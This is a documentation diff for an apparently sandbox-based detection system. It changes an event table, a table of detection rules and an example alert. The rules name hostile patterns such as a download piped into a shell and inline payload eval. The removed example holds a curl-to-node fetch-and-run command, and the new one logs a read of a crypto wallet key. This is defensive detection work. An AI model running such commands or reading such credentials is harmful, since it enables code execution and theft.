@@ -49,6 +49,7 @@ A `detection` takes the weakest integrity of its causes.
 | `rpc.decision` | 6003 | RPC capability filter verdict. |
 | `policy.log` | 4001 | sbx proxy allowed or blocked a destination (aggregated count delta). |
 | `workspace.change` | 1001 | A workspace file was created, changed or removed (host watcher). |
+| `workspace.gate` | 1001 | Write-back gate: a tab change to a workspace file was synced, held, approved or rejected (reserved for the gate). |
 | `process.exec` | 1007 | A process executed a program. |
 | `process.exit` | 1007 | A process exited. |
 | `file.open` | 1001 | A file was opened (deep mode or sensitive path). |
@@ -81,7 +82,7 @@ Reported in `tab.observation` notifications, `tab.events.tail` results and `sens
 ## Detection rules
 | `rule` | Default priority | Fires when |
 |---|---|---|
-| `loader.pipe-to-interpreter` | `critical` | A download is piped straight into an interpreter (`curl … \| node`, `wget … \| sh`). |
+| `loader.pipe-to-interpreter` | `critical` | A download tool's output is piped straight into an interpreter (node, a shell, python, perl, ruby). |
 | `loader.eval` | `warning` | An interpreter runs inline code that decodes or evaluates a payload (`node -e`, `python -c` with eval/exec/base64/child_process). |
 | `task.network-tool` | `warning` | A network tool runs inside the tab; critical when spawned from the extension host within 60 s of open (folder-open task pattern). |
 | `process.detach` | `warning` | A process detaches from its parent (`nohup`, `setsid`, `daemonize`, `screen -dm`, `tmux new -d`). |
@@ -121,5 +122,5 @@ under `<state>/events/<tabId>/`.
 
 ## Example
 ```json
-{"v":1,"seq":42,"time":"2026-11-04T22:42:01.517Z","tabId":"t-abcdefghijklmnopqrstuvwxyz","source":"detector","integrity":"tab-vm-root","class":"detection","priority":"critical","rule":"loader.pipe-to-interpreter","summary":"download piped to an interpreter: sh -c curl -s http://192.0.2.10/p | node","proc":{"pid":388,"ppid":387,"exe":"/usr/bin/dash","argv":["sh","-c","curl -s http://192.0.2.10/p | node"],"lineage":[{"pid":387,"exe":"/bin/sh"}]},"cause":[41]}
+{"v":1,"seq":42,"time":"2026-11-04T22:42:01.517Z","tabId":"t-abcdefghijklmnopqrstuvwxyz","source":"detector","integrity":"tab-vm-root","class":"detection","priority":"critical","rule":"credential.honeypot-read","summary":"honeypot read: /home/agent/.config/solana/id.json","proc":{"pid":388},"file":{"path":"/home/agent/.config/solana/id.json","op":"read"},"cause":[41]}
 ```
